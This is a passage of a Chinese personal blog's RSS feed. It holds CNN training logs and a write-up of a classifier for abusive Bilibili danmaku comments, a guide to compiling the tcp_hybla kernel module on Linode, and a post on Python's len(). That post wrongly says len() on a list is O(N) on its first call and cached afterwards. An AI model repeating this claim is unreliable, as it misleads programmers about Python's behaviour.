<p>人工检测结果有所提升，但是仍然不够理想，提高到50次看看</p>
<pre><code>Epoch 50/50
2999/2999 [==============================] - 9s - loss: 6.4179e-04 - acc: 1.0000

Correct: 1963
Incorrect: 38
Accuracy: 98.101
</code></pre>
<p>虽然训练数据很好看，但是检查弹幕的识别情况，发现已经过拟合。基本把所有低素质弹幕识别成普通弹幕。</p>
<pre><code>Negative damku accuracy: 7.692
True negative: 2
False negative: 24
</code></pre>
<p>重新回到10次迭代，尝试画出roc曲线</p>
<pre><code>Epoch 10/10
2999/2999 [==============================] - 9s - loss: 0.7608 - acc: 0.8943

Correct: 1886
Incorrect: 115
Overall accuracy: 94.253
Negative damku accuracy: 30.769
True negative: 8
False negative: 18
</code></pre>
<p>然后是20次迭代</p>
<pre><code>Epoch 20/20
2999/2999 [==============================] - 10s - loss: 0.1805 - acc: 0.9710

Correct: 1908
Incorrect: 93
Overall accuracy: 95.352
Negative damku accuracy: 19.231
True negative: 5
False negative: 21
</code></pre>
<p>15次迭代</p>
<pre><code>Epoch 15/15
2999/2999 [==============================] - 9s - loss: 0.3569 - acc: 0.9650

Correct: 1782
Incorrect: 219
Overall accuracy: 89.055
Negative damku accuracy: 46.154
True negative: 12
False negative: 14

Epoch 17/17
2999/2999 [==============================] - 9s - loss: 0.3631 - acc: 0.9847

Correct: 1893
Incorrect: 108
Overall accuracy: 94.603
Negative damku accuracy: 26.923
True negative: 7
False negative: 19

2999/2999 [==============================] - 10s - loss: 0.2556 - acc: 0.9760

Correct: 1816
Incorrect: 185
Overall accuracy: 90.755
Negative damku accuracy: 30.769
True negative: 8
False negative: 18
</code></pre>
<p>突然想到训练数据其实不需要遵从概率分布，直接使用上次贝叶斯分类器的弹幕数据即可（上次训练贝叶斯分类器的时候没注意训练样本的概率分布问题，这是个错误）。导入新样本后进行迭代测试</p>
<pre><code>Epoch 1/1
5405/5405 [==============================] - 19s - loss: 0.6693 - acc: 0.6699     
Train epoch: 1
Correct: 2912
Incorrect: 692
Overall accuracy: 80.799
Negative damku accuracy: 81.522
True negative: 1328
False negative: 301
==========
Epoch 1/1
5405/5405 [==============================] - 19s - loss: 0.4421 - acc: 0.8344     
Train epoch: 2
Correct: 3133
Incorrect: 471
Overall accuracy: 86.931
Negative damku accuracy: 82.627
True negative: 1346
False negative: 283
==========
Epoch 1/1
5405/5405 [==============================] - 19s - loss: 0.2734 - acc: 0.9075     
Train epoch: 3
Correct: 3294
Incorrect: 310
Overall accuracy: 91.398
Negative damku accuracy: 86.618
True negative: 1411
False negative: 218
==========
Epoch 1/1
5405/5405 [==============================] - 20s - loss: 0.1724 - acc: 0.9404     
Train epoch: 4
Correct: 3365
Incorrect: 239
Overall accuracy: 93.368
Negative damku accuracy: 90.117
True negative: 1468
False negative: 161
==========
Epoch 1/1
5405/5405 [==============================] - 22s - loss: 0.1117 - acc: 0.9641     
Train epoch: 5
Correct: 3390
Incorrect: 214
Overall accuracy: 94.062
Negative damku accuracy: 92.879
True negative: 1513
False negative: 116
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0770 - acc: 0.9771     
Train epoch: 6
Correct: 3416
Incorrect: 188
Overall accuracy: 94.784
Negative damku accuracy: 94.598
True negative: 1541
False negative: 88
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0505 - acc: 0.9858     
Train epoch: 7
Correct: 3403
Incorrect: 201
Overall accuracy: 94.423
Negative damku accuracy: 91.590
True negative: 1492
False negative: 137
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0414 - acc: 0.9900     
Train epoch: 8
Correct: 3426
Incorrect: 178
Overall accuracy: 95.061
Negative damku accuracy: 94.905
True negative: 1546
False negative: 83
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0365 - acc: 0.9902     
Train epoch: 9
Correct: 3417
Incorrect: 187
Overall accuracy: 94.811
Negative damku accuracy: 92.756
True negative: 1511
False negative: 118
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0231 - acc: 0.9943     
Train epoch: 10
Correct: 3415
Incorrect: 189
Overall accuracy: 94.756
Negative damku accuracy: 92.449
True negative: 1506
False negative: 123
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0320 - acc: 0.9906     
Train epoch: 11
Correct: 3396
Incorrect: 208
Overall accuracy: 94.229
Negative damku accuracy: 94.905
True negative: 1546
False negative: 83
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0158 - acc: 0.9959     
Train epoch: 12
Correct: 3416
Incorrect: 188
Overall accuracy: 94.784
Negative damku accuracy: 93.738
True negative: 1527
False negative: 102
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0093 - acc: 0.9983     
Train epoch: 13
Correct: 3415
Incorrect: 189
Overall accuracy: 94.756
Negative damku accuracy: 95.212
True negative: 1551
False negative: 78
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0048 - acc: 0.9991     
Train epoch: 14
Correct: 3421
Incorrect: 183
Overall accuracy: 94.922
Negative damku accuracy: 94.843
True negative: 1545
False negative: 84
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0052 - acc: 0.9989     
Train epoch: 15
Correct: 3421
Incorrect: 183
Overall accuracy: 94.922
Negative damku accuracy: 93.923
True negative: 1530
False negative: 99
==========
Epoch 1/1
5405/5405 [==============================] - 20s - loss: 0.0024 - acc: 0.9998         
Train epoch: 16
Correct: 3413
Incorrect: 191
Overall accuracy: 94.700
Negative damku accuracy: 94.291
True negative: 1536
False negative: 93
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0028 - acc: 0.9998     
Train epoch: 17
Correct: 3418
Incorrect: 186
Overall accuracy: 94.839
Negative damku accuracy: 93.186
True negative: 1518
False negative: 111
==========
Epoch 1/1
5405/5405 [==============================] - 21s - loss: 0.0024 - acc: 0.9996         
Train epoch: 18
Correct: 3415
Incorrect: 189
Overall accuracy: 94.756
Negative damku accuracy: 94.352
True negative: 1537
False negative: 92
==========
Epoch 1/1
5405/5405 [==============================] - 19s - loss: 0.0013 - acc: 0.9996         
Train epoch: 19
Correct: 3425
Incorrect: 179
Overall accuracy: 95.033
Negative damku accuracy: 94.475
True negative: 1539
False negative: 90
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 9.6297e-04 - acc: 0.9998     
Train epoch: 20
Correct: 3417
Incorrect: 187
Overall accuracy: 94.811
Negative damku accuracy: 93.493
True negative: 1523
False negative: 106
==========
</code></pre>
<p>想起来一开始 word2vec model 是用的娱乐区弹幕训练的，不完全符合环境。导出游戏区的弹幕重新训练看。</p>
<pre><code>Epoch 1/1
5405/5405 [==============================] - 17s - loss: 0.5780 - acc: 0.7441     
Train epoch: 1
Correct: 3140
Incorrect: 464
Overall accuracy: 87.125
Negative damku accuracy: 89.134
True negative: 1452
False negative: 177
==========
Epoch 1/1
5405/5405 [==============================] - 17s - loss: 0.2168 - acc: 0.9258     
Train epoch: 2
Correct: 3444
Incorrect: 160
Overall accuracy: 95.560
Negative damku accuracy: 93.738
True negative: 1527
False negative: 102
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0978 - acc: 0.9697     
Train epoch: 3
Correct: 3459
Incorrect: 145
Overall accuracy: 95.977
Negative damku accuracy: 95.887
True negative: 1562
False negative: 67
==========
Epoch 1/1
5405/5405 [==============================] - 22s - loss: 0.0606 - acc: 0.9824     
Train epoch: 4
Correct: 3426
Incorrect: 178
Overall accuracy: 95.061
Negative damku accuracy: 96.746
True negative: 1576
False negative: 53
==========
Epoch 1/1
5405/5405 [==============================] - 23s - loss: 0.1076 - acc: 0.9678     
Train epoch: 5
Correct: 3468
Incorrect: 136
Overall accuracy: 96.226
Negative damku accuracy: 94.537
True negative: 1540
False negative: 89
==========
Epoch 1/1
5405/5405 [==============================] - 20s - loss: 0.0476 - acc: 0.9856     
Train epoch: 6
Correct: 3465
Incorrect: 139
Overall accuracy: 96.143
Negative damku accuracy: 95.028
True negative: 1548
False negative: 81
==========
Epoch 1/1
5405/5405 [==============================] - 19s - loss: 0.0285 - acc: 0.9911     
Train epoch: 7
Correct: 3472
Incorrect: 132
Overall accuracy: 96.337
Negative damku accuracy: 95.150
True negative: 1550
False negative: 79
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0192 - acc: 0.9943     
Train epoch: 8
Correct: 3473
Incorrect: 131
Overall accuracy: 96.365
Negative damku accuracy: 96.010
True negative: 1564
False negative: 65
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0128 - acc: 0.9956     
Train epoch: 9
Correct: 3472
Incorrect: 132
Overall accuracy: 96.337
Negative damku accuracy: 95.580
True negative: 1557
False negative: 72
==========
Epoch 1/1
5405/5405 [==============================] - 17s - loss: 0.0079 - acc: 0.9972     
Train epoch: 10
Correct: 3474
Incorrect: 130
Overall accuracy: 96.393
Negative damku accuracy: 95.580
True negative: 1557
False negative: 72
==========
Epoch 1/1
5405/5405 [==============================] - 20s - loss: 0.0060 - acc: 0.9981     
Train epoch: 11
Correct: 3476
Incorrect: 128
Overall accuracy: 96.448
Negative damku accuracy: 95.396
True negative: 1554
False negative: 75
==========
Epoch 1/1
5405/5405 [==============================] - 27s - loss: 0.0045 - acc: 0.9989     
Train epoch: 12
Correct: 3478
Incorrect: 126
Overall accuracy: 96.504
Negative damku accuracy: 95.089
True negative: 1549
False negative: 80
==========
Epoch 1/1
5405/5405 [==============================] - 22s - loss: 0.0031 - acc: 0.9994     
Train epoch: 13
Correct: 3476
Incorrect: 128
Overall accuracy: 96.448
Negative damku accuracy: 95.150
True negative: 1550
False negative: 79
==========
Epoch 1/1
5405/5405 [==============================] - 19s - loss: 0.0024 - acc: 0.9994         
Train epoch: 14
Correct: 3479
Incorrect: 125
Overall accuracy: 96.532
Negative damku accuracy: 95.089
True negative: 1549
False negative: 80
==========
Epoch 1/1
5405/5405 [==============================] - 19s - loss: 0.0020 - acc: 0.9994         
Train epoch: 15
Correct: 3476
Incorrect: 128
Overall accuracy: 96.448
Negative damku accuracy: 94.966
True negative: 1547
False negative: 82
==========
Epoch 1/1
5405/5405 [==============================] - 22s - loss: 0.0018 - acc: 0.9994         
Train epoch: 16
Correct: 3474
Incorrect: 130
Overall accuracy: 96.393
Negative damku accuracy: 95.150
True negative: 1550
False negative: 79
==========
Epoch 1/1
5405/5405 [==============================] - 19s - loss: 0.0016 - acc: 0.9994         
Train epoch: 17
Correct: 3475
Incorrect: 129
Overall accuracy: 96.421
Negative damku accuracy: 95.457
True negative: 1555
False negative: 74
==========
Epoch 1/1
5405/5405 [==============================] - 21s - loss: 0.0014 - acc: 0.9994         
Train epoch: 18
Correct: 3474
Incorrect: 130
Overall accuracy: 96.393
Negative damku accuracy: 95.150
True negative: 1550
False negative: 79
==========
Epoch 1/1
5405/5405 [==============================] - 24s - loss: 0.0013 - acc: 0.9996     
Train epoch: 19
Correct: 3474
Incorrect: 130
Overall accuracy: 96.393
Negative damku accuracy: 95.089
True negative: 1549
False negative: 80
==========
Epoch 1/1
5405/5405 [==============================] - 21s - loss: 0.0037 - acc: 0.9991         
Train epoch: 20
Correct: 3469
Incorrect: 135
Overall accuracy: 96.254
Negative damku accuracy: 96.624
True negative: 1574
False negative: 55
==========
</code></pre>
<p>效果提升明显</p>
<p>尝试把训练 ratio 提高到 0.8</p>
<pre><code>Epoch 1/1
7206/7206 [==============================] - 24s - loss: 0.5097 - acc: 0.7778     
Train epoch: 1
Correct: 1673
Incorrect: 130
Overall accuracy: 92.790
Negative damku accuracy: 91.779
True negative: 748
False negative: 67
==========
Epoch 1/1
7206/7206 [==============================] - 23s - loss: 0.1654 - acc: 0.9455     
Train epoch: 2
Correct: 1745
Incorrect: 58
Overall accuracy: 96.783
Negative damku accuracy: 95.092
True negative: 775
False negative: 40
==========
Epoch 1/1
7206/7206 [==============================] - 24s - loss: 0.0891 - acc: 0.9732     
Train epoch: 3
Correct: 1750
Incorrect: 53
Overall accuracy: 97.060
Negative damku accuracy: 97.055
True negative: 791
False negative: 24
==========
Epoch 1/1
7206/7206 [==============================] - 23s - loss: 0.0570 - acc: 0.9829     
Train epoch: 4
Correct: 1739
Incorrect: 64
Overall accuracy: 96.450
Negative damku accuracy: 96.933
True negative: 790
False negative: 25
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0394 - acc: 0.9878     
Train epoch: 5
Correct: 1754
Incorrect: 49
Overall accuracy: 97.282
Negative damku accuracy: 96.074
True negative: 783
False negative: 32
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0471 - acc: 0.9872     
Train epoch: 6
Correct: 1747
Incorrect: 56
Overall accuracy: 96.894
Negative damku accuracy: 95.706
True negative: 780
False negative: 35
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0266 - acc: 0.9926     
Train epoch: 7
Correct: 1735
Incorrect: 68
Overall accuracy: 96.229
Negative damku accuracy: 95.706
True negative: 780
False negative: 35
==========
Epoch 1/1
7206/7206 [==============================] - 26s - loss: 0.0235 - acc: 0.9921     
Train epoch: 8
Correct: 1742
Incorrect: 61
Overall accuracy: 96.617
Negative damku accuracy: 95.706
True negative: 780
False negative: 35
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0211 - acc: 0.9928     
Train epoch: 9
Correct: 1753
Incorrect: 50
Overall accuracy: 97.227
Negative damku accuracy: 96.074
True negative: 783
False negative: 32
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0207 - acc: 0.9929     
Train epoch: 10
Correct: 1750
Incorrect: 53
Overall accuracy: 97.060
Negative damku accuracy: 95.951
True negative: 782
False negative: 33
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0282 - acc: 0.9913     
Train epoch: 11
Correct: 1743
Incorrect: 60
Overall accuracy: 96.672
Negative damku accuracy: 96.442
True negative: 786
False negative: 29
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0174 - acc: 0.9947     
Train epoch: 12
Correct: 1737
Incorrect: 66
Overall accuracy: 96.339
Negative damku accuracy: 96.564
True negative: 787
False negative: 28
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0135 - acc: 0.9965     
Train epoch: 13
Correct: 1741
Incorrect: 62
Overall accuracy: 96.561
Negative damku accuracy: 96.933
True negative: 790
False negative: 25
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0106 - acc: 0.9965     
Train epoch: 14
Correct: 1743
Incorrect: 60
Overall accuracy: 96.672
Negative damku accuracy: 96.687
True negative: 788
False negative: 27
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0068 - acc: 0.9975     
Train epoch: 15
Correct: 1751
Incorrect: 52
Overall accuracy: 97.116
Negative damku accuracy: 95.460
True negative: 778
False negative: 37
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0053 - acc: 0.9982     
Train epoch: 16
Correct: 1748
Incorrect: 55
Overall accuracy: 96.950
Negative damku accuracy: 96.564
True negative: 787
False negative: 28
==========
Epoch 1/1
7206/7206 [==============================] - 23s - loss: 0.0051 - acc: 0.9986     
Train epoch: 17
Correct: 1751
Incorrect: 52
Overall accuracy: 97.116
Negative damku accuracy: 95.460
True negative: 778
False negative: 37
==========
Epoch 1/1
7206/7206 [==============================] - 24s - loss: 0.0038 - acc: 0.9989     
Train epoch: 18
Correct: 1749
Incorrect: 54
Overall accuracy: 97.005
Negative damku accuracy: 96.319
True negative: 785
False negative: 30
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0036 - acc: 0.9990     
Train epoch: 19
Correct: 1747
Incorrect: 56
Overall accuracy: 96.894
Negative damku accuracy: 95.583
True negative: 779
False negative: 36
==========
Epoch 1/1
7206/7206 [==============================] - 23s - loss: 0.0035 - acc: 0.9989         
Train epoch: 20
Correct: 1746
Incorrect: 57
Overall accuracy: 96.839
Negative damku accuracy: 95.215
True negative: 776
False negative: 39
==========
</code></pre>
<p>测试效果提升了约1~2个百分点。</p>
<p>暂时没有想到能够优化的方面了，选用第3次迭代的模型作为最终模型</p>
]]></content>
		</item>
		
		<item>
			<title>低素质弹幕分类器的CNN实现</title>
			<link>https://yinzo.github.io/posts/%E4%BD%8E%E7%B4%A0%E8%B4%A8%E5%BC%B9%E5%B9%95%E5%88%86%E7%B1%BB%E5%99%A8%E7%9A%84cnn%E5%AE%9E%E7%8E%B0/</link>
			<pubDate>Mon, 06 Feb 2017 14:48:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E4%BD%8E%E7%B4%A0%E8%B4%A8%E5%BC%B9%E5%B9%95%E5%88%86%E7%B1%BB%E5%99%A8%E7%9A%84cnn%E5%AE%9E%E7%8E%B0/</guid>
			<description>低素质弹幕分类器的CNN实现 对于一条弹幕，首先进行分词，然后通过 word2vec 转换为词向量，再填充至固定长度，作为卷积神经网络的输入。 卷积神经网络的结构</description>
			<content type="html"><![CDATA[<h1 id="低素质弹幕分类器的cnn实现">低素质弹幕分类器的CNN实现</h1>
<!-- raw HTML omitted -->
<p>对于一条弹幕，首先进行分词，然后通过 word2vec 转换为词向量，再填充至固定长度，作为卷积神经网络的输入。</p>
<p>卷积神经网络的结构如下：</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>最终输出为2位的 categorical result，直接使用第一项，即骂人弹幕的概率作为输出。</p>
<p>然后通过代理，在弹幕服务器与播放器之间插入一层，实现弹幕的分类与屏蔽。最终实现了有效的骂人弹幕自动屏蔽，但是误伤的情况依然存在。</p>
<!-- raw HTML omitted -->
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>使用游戏区的所有弹幕来训练 word2vec model。这里我是用的是 word2vec 的 Python 实现 gensim</p>
<p>训练脚本来自这篇文章 <a href="http://www.52nlp.cn/%E4%B8%AD%E8%8B%B1%E6%96%87%E7%BB%B4%E5%9F%BA%E7%99%BE%E7%A7%91%E8%AF%AD%E6%96%99%E4%B8%8A%E7%9A%84word2vec%E5%AE%9E%E9%AA%8C">中英文维基百科语料上的Word2Vec实验</a></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>然后，我从所有弹幕中随机抽取了5000条，进行人工标注分类，其中有63条骂人弹幕。由于骂人弹幕太少，我又通过关键词搜索加人工筛选的方式，增加了4000条骂人弹幕。</p>
<p>以这约9000条弹幕作为训练样本，80%的弹幕作为 train set， 其余的20%作为 validation set</p>
<p>对训练样本进行预处理：</p>
<ol>
<li>分词</li>
<li>转换为词向量</li>
<li>填充至100位长，其中填充的位的词向量全部置零。</li>
</ol>
<p>开始构建卷积神经网络，我选用的框架是使用 TensorFlow 后端的 keras。最终经过调试，得到这样一个结构</p>
<p><a href="https://yinzo.github.io/14863637259966.html">具体的训练过程可以看这里</a></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>需要注意的是，<code>model.fit</code> 指定了 class weight</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>单次训练迭代时间约25秒，我总共迭代了20次。其中每次迭代我都将 model 保存到一个列表中，并使用当前 model 对验证集进行测试，输出测试结果。</p>
<p>然后根据测试结果，选用了第3次迭代的 model ，尝试使用新的，不在样本中的视频弹幕进行人工检验识别效果。</p>
<p>选用视频 <a href="http://www.bilibili.com/video/av8365806/">av8365806</a> 里面存在大量对骂的弹幕，适合进行测试</p>
<p>这里我花了小半天时间，用 tornado 搭了个服务器，模拟 comment.bilibili.com 的所有请求，其中对于弹幕的请求，插入一层封装好的神经网络模型进行分类，再返回给用户请求，其余请求直接转发。搭建好后通过 Surge 的 URL Rewrite 将请求转到本地服务器上。</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbflg75a0j310u0700tm.jpg" alt="屏幕快照 2017-02-06 13.24.12"></p>
<p>然后此时访问弹幕都会先经过本地服务器进行处理了。查看 av8365806 的弹幕分类情况：</p>
<p>首先是比较欣慰的结果，大部分直接用脏字喷人的弹幕都被高确信地识别出来了<br>
<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbflctg25j30po0hijw0.jpg" alt="屏幕快照 2017-02-06 13.26.37"></p>
<p>其次，存在一些短弹幕被误伤的情况，而且确信度还莫名的挺高<br>
<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbfm1h0brj30o406wwge.jpg" alt="屏幕快照 2017-02-06 13.26.51"></p>
<p>然后，依然存在一部分弹幕脏字不明显，以及一些反讽的语句没有识别出来<br>
<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbflvz7qfj30o406wwge.jpg" alt="屏幕快照 2017-02-06 13.27.39"></p>
<p>另外由于3000弹幕的识别时间在5秒左右，再加上网络延迟以及一些预处理后处理的时间，整体延迟约10秒，所以这个代理服务器可能还没能达到投入大规模使用的效率，比较可惜。</p>
<p>但是其识别效果，对于日常观感绝对是有所提升的。</p>
<p>脑海中对于屏蔽模式可以分为以下三挡：</p>
<ol>
<li>【仁慈模式】被分类器识别为骂人的弹幕，弹幕内容前填充100个空格，颜色变为白色，字号变小，统一为滚动弹幕。其中，填充空格能够使得这条弹幕将会以极快的速度飘过视野。</li>
<li>【常规模式】被分类器识别为骂人的弹幕直接删除，该弹幕的发送者的其他弹幕使用仁慈模式进行修正。</li>
<li>【灭杀模式】被分类器识别为骂人的弹幕，以及其发送者发送的其他弹幕，统一删除。</li>
</ol>
<p>原本对于仁慈模式是想进行高透明度处理的，但是由于B站弹幕不支持分开透明度所以就变成了现在的方案。不过由于可以直接修改弹幕类型，不知道高级弹幕是否支持透明度选项，以及高级弹幕在各个平台上的支持度如何。</p>
<!-- raw HTML omitted -->
<p>这次构建卷积神经网络，是学习深度学习方向以来第一次完全自己设计网络结构，并独立完成所有的过程，包括样本收集、样本处理、搭建网络、训练，并且实现了模型的真实可用。作为深度学习的阶段性成果，也是给了我很大的鼓励。这个假期接下来的时间，准备继续学习 RNN 以及 LSTM 等模型，以及其他优化技巧。</p>
]]></content>
		</item>
		
		<item>
			<title>在 Linode 上编译 hybla 模块</title>
			<link>https://yinzo.github.io/posts/%E5%9C%A8-linode-%E4%B8%8A%E7%BC%96%E8%AF%91-hybla-%E6%A8%A1%E5%9D%97/</link>
			<pubDate>Tue, 27 Dec 2016 23:22:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E5%9C%A8-linode-%E4%B8%8A%E7%BC%96%E8%AF%91-hybla-%E6%A8%A1%E5%9D%97/</guid>
			<description>在 Linode 上编译 hybla 模块 执行到这一步时运行出错 Google 一番后发现是缺少 tcp_hybla 模块，需要自己手动编译。引用一下 https://plus.google.com/+BoluoKING/posts/dLyYhBf3mwp 的科普 中美之间的线路质量不是很好，rtt较长且时</description>
			<content type="html"><![CDATA[<h1 id="在-linode-上编译-hybla-模块">在 Linode 上编译 hybla 模块</h1>
<!-- raw HTML omitted -->
<p>执行到这一步时运行出错</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>Google 一番后发现是缺少 tcp_hybla 模块，需要自己手动编译。引用一下 <a href="https://plus.google.com/+BoluoKING/posts/dLyYhBf3mwp">https://plus.google.com/+BoluoKING/posts/dLyYhBf3mwp</a> 的科普</p>
<blockquote>
<p>中美之间的线路质量不是很好，rtt较长且时常丢包。TCP的设计目的是解决不可靠线路上可靠传输的问题，即为了解决丢包，但丢包却使TCP传输速度大幅下降。HTTP协议在传输层使用的是TCP协议，所以网页下载的速度就取决于TCP单线程下载的速度（因为网页就是单线程下载的）。丢包使得TCP传输速度大幅下降的主要原因是丢包重传机制，控制这一机制的就是TCP拥塞控制算法。<br>
Linux内核中提供了若干套TCP拥塞控制算法，这些算法各自适用于不同的环境。</p>
<p>1）reno是最基本的拥塞控制算法，也是TCP协议的实验原型。<br>
2）bic适用于rtt较高但丢包极为罕见的情况，比如北美和欧洲之间的线路，这是2.6.8到2.6.18之间的Linux内核的默认算法。<br>
3）cubic是修改版的bic，适用环境比bic广泛一点，它是2.6.19之后的linux内核的默认算法。<br>
4）hybla适用于高延时、高丢包率的网络，比如卫星链路——同样适用于中美之间的链路。<br>
我们需要做的工作就是将TCP拥塞控制算法改为hybla算法，并且优化TCP参数。</p>
</blockquote>
<p>于是又开始找 hybla 模块的编译指南，参考了这两篇文章，并且修改了一下不太明确的地方，写个修改版的指南吧。</p>
<ul>
<li><a href="https://moonagic.com/linode-setup-hybla-htcp/">Linode编译hybla htcp模块</a></li>
<li><a href="http://www.777s.me/linode-hybla-htcp.html">Linode编译hybla htcp拥塞控制算法模块</a></li>
</ul>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>在这里下载 <a href="https://www.kernel.org/pub/linux/kernel/">https://www.kernel.org/pub/linux/kernel/</a></p>
<p>我这里是 <code>4.8.3</code>，于是进入 <code>v4.x</code> 目录，向下翻即找到了，复制文件地址，在vps上 <code>wget</code> 下载下来</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>注意修改对应的下载地址和文件名</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>然后用你喜欢的编辑器编辑 <code>.config</code> 文件，查找 <code>CONFIG_TCP_CONG_CUBIC=y</code>，在这一行下面增加一行</p>
<pre><code>CONFIG_TCP_CONG_HYBLA=y
</code></pre>
<p>然后编译</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>编译耗时约15~20分钟</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>以下是 <code>hybla</code> 所用的 Makefile</p>
<pre><code># Makefile for tcp_hybla.ko
obj-m := tcp_hybla.o  
KDIR := /tmp/kernel/linux-4.8.3  
PWD := $(shell pwd)  
default:  
    $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules
</code></pre>
<p>注意上面__第三行 <code>KDIR := /root/kernel/linux-3.11.6</code> 要修改成自己解压的目录__，并且最后一行必须以 __<code>tab</code>__ 开头，__不可以用空格，不可以用空格__。不懂Makefile的规则，我在这里踩了坑。</p>
<!-- raw HTML omitted -->
<p>这里退回到 <code>linux-4.8.3</code> 目录，我是放在 <code>/tmp/kernel</code> 内的，后面目录相关的就不提示了</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>如果遇到command not found: insmod则需要手动安装</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>如果编译的时候如果出现如下错误</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>需要源安装libssl-dev就可以了</p>
<!-- raw HTML omitted -->
<p>至此就装好了hybla 模块，后面继续按照 <a href="https://github.com/shadowsocks/shadowsocks/wiki/Optimizing-Shadowsocks">优化指南</a> 优化去了</p>
]]></content>
		</item>
		
		<item>
			<title>无需手动缓存长度</title>
			<link>https://yinzo.github.io/posts/%E6%97%A0%E9%9C%80%E6%89%8B%E5%8A%A8%E7%BC%93%E5%AD%98%E9%95%BF%E5%BA%A6/</link>
			<pubDate>Wed, 27 Jul 2016 17:13:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E6%97%A0%E9%9C%80%E6%89%8B%E5%8A%A8%E7%BC%93%E5%AD%98%E9%95%BF%E5%BA%A6/</guid>
			<description>无需手动缓存长度 其中数据集是一个List。看到这里说到为了提高代码效率，特地开了一个变量来保存其长度。 我回忆起以前调试bug的时候，总是能看</description>
			<content type="html"><![CDATA[<h1 id="无需手动缓存长度">无需手动缓存长度</h1>
<!-- raw HTML omitted -->
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbfnxmuo1j31400u0gua.jpg" alt="IMG_0629"></p>
<p>其中数据集是一个List。看到这里说到为了提高代码效率，特地开了一个变量来保存其长度。</p>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>我回忆起以前调试bug的时候，总是能看到List对象里面有一个函数<code>__len__</code>，想必Python对于这种常用函数会有所优化，对于这种集合类型的对象，如果对其长度进行缓存，这样多次调用<code>len</code>函数，就不会重复进行遍历计算了。这么简单的优化，Python必然是有做的。</p>
<p>于是去Google，原本准备搜len函数的具体实现代码，结果直接找到stackoverflow有<a href="http://stackoverflow.com/questions/29057153/does-the-len-built-in-function-iterates-through-the-collection-to-calculate-it">相关问题</a>，明确的验证了我的想法。</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbfnoq2xnj314u0ho78t.jpg" alt="屏幕快照 2016-07-27 18.44.21"></p>
<p>对于这种类型，Python都会对其长度进行缓存。也就是说，对于len函数，只在第一次调用的时候复杂度为<code>O(N)</code>，后续调用的复杂度都是常数级的。所以，我们平时写代码的时候，可以不需要多此一举的再开一个单独的变量来缓存了。也就是说，以下代码在没有特殊需求的情况下，是多此一举的：</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<blockquote>
</blockquote>
]]></content>
		</item>
		
		<item>
			<title>使用 Python 装饰器来将普通函数加入任务队列</title>
			<link>https://yinzo.github.io/posts/%E4%BD%BF%E7%94%A8-python-%E8%A3%85%E9%A5%B0%E5%99%A8%E6%9D%A5%E5%B0%86%E6%99%AE%E9%80%9A%E5%87%BD%E6%95%B0%E5%8A%A0%E5%85%A5%E4%BB%BB%E5%8A%A1%E9%98%9F%E5%88%97/</link>
